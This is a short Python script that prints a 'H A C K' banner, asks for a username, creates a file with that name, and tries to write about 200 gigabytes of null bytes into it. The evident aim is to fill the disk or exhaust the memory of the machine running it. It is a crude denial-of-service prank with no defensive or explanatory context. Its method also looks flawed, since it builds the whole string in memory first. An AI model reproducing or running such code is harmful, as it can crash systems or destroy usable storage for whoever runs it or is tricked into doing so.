
import pyfiglet as w
print(w.figlet_format("H A C K"))
#username
usernames = str(input("Username: "))
created = open(usernames, "x")
size = 200000000000
created.write("\0" * size)
